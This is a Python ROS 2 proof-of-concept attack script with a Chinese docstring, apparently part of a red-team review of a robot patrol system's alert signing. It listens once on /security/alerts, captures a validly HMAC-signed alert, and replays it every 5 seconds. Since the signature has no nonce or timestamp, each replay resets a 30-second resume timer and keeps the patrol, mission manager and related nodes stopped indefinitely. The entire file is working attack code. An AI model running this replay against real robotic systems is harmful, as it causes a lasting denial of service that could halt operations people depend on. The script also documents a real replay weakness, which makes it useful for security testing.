#!/usr/bin/env python3
"""攻擊 N3 — /security/alerts replay → 永久 patrol DoS（不需 secret）.

威脅模型 B（alert 偽造）的修補是「HMAC 簽章」，但 sign_alert 沒包含 nonce
或 timestamp，所以「合法簽章 alert 的 bytes」本身可被重放：

    sign_alert(payload, secret) =
        json({"payload": <text>, "sig": HMAC(text, secret)})
        ^^^ 沒有 nonce、沒有時間戳 ^^^

patrol_node._cb_alert 邏輯：
    payload = verify_alert(msg.data, secret)
    if payload is None: return   ← HMAC 對就通過
    if not self._paused:
        self._paused = True
        self._pub(0, 0)           ← 立刻停車
    # ★ 重置 30 秒 resume timer
    self._resume_timer = self.create_timer(30.0, self._resume)

→ 只要每 < 30 秒重放一次同樣的 bytes，patrol 永遠不會 resume = 永久 DoS

threat model 寫「拿到 alert_secret out of scope」但**這個攻擊根本不需要 secret**
攻擊者只要曾經監聽過 /security/alerts 一次（例如監控正常觸發了一個合法 alert，
或攻擊者短暫啟動非白名單 node 故意觸發），就能無限重放這筆 alert 讓 patrol
永遠停車。

攻擊鏈：
    Phase 1: 監聽 /security/alerts，抓一筆合法 signed bytes
    Phase 2: 每 5 秒重放一次（遠 < 30s resume timer）→ patrol 永久停擺

對 burger_sac_env / mission_manager / system_status 也同樣有效（共用同邏輯）。
"""
import sys
import time
import rclpy
from rclpy.node import Node
from rclpy.qos import (DurabilityPolicy, QoSProfile, ReliabilityPolicy)
from std_msgs.msg import String


class AlertReplayer(Node):

    def __init__(self):
        super().__init__('attacker_alert_replay')
        # 同樣 QoS 才能訂到 monitor 發的 alert
        qos_sub = QoSProfile(
            depth=10,
            reliability=ReliabilityPolicy.RELIABLE,
            durability=DurabilityPolicy.TRANSIENT_LOCAL,
        )
        qos_pub = QoSProfile(
            depth=10,
            reliability=ReliabilityPolicy.RELIABLE,
            durability=DurabilityPolicy.TRANSIENT_LOCAL,
        )
        self._captured: str | None = None
        self._capture_sub = self.create_subscription(
            String, '/security/alerts', self._on_capture, qos_sub)
        self._replay_pub = self.create_publisher(
            String, '/security/alerts', qos_pub)
        self._replay_timer = None
        self._n = 0
        self.get_logger().warn(
            '🎯 監聽 /security/alerts 等待一筆合法 alert...'
        )

    def _on_capture(self, msg: String):
        if self._captured is not None:
            return
        self._captured = msg.data
        self.get_logger().error(
            f'📼 捕獲簽章 alert: {msg.data[:120]}...'
        )
        self.destroy_subscription(self._capture_sub)
        # 5s 遠小於 patrol 的 30s resume timer
        self._replay_timer = self.create_timer(5.0, self._replay)
        self.get_logger().error(
            '🔁 開始無限重放（每 5s 一次，遠 < patrol 的 30s resume timer）'
            '\n   → patrol_node / burger_env / mission_manager 將永久停車'
        )

    def _replay(self):
        if self._captured is None:
            return
        m = String()
        m.data = self._captured
        self._replay_pub.publish(m)
        self._n += 1
        self.get_logger().warn(
            f'💀 重放 #{self._n} — patrol 的 resume timer 又被重置 30s'
        )


def main():
    rclpy.init()
    node = AlertReplayer()
    deadline = time.monotonic() + (
        float(sys.argv[1]) if len(sys.argv) > 1 else 60.0
    )
    try:
        while rclpy.ok() and time.monotonic() < deadline:
            rclpy.spin_once(node, timeout_sec=0.5)
    finally:
        node.get_logger().error(f'⏹ 結束，總共重放 {node._n} 次')
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
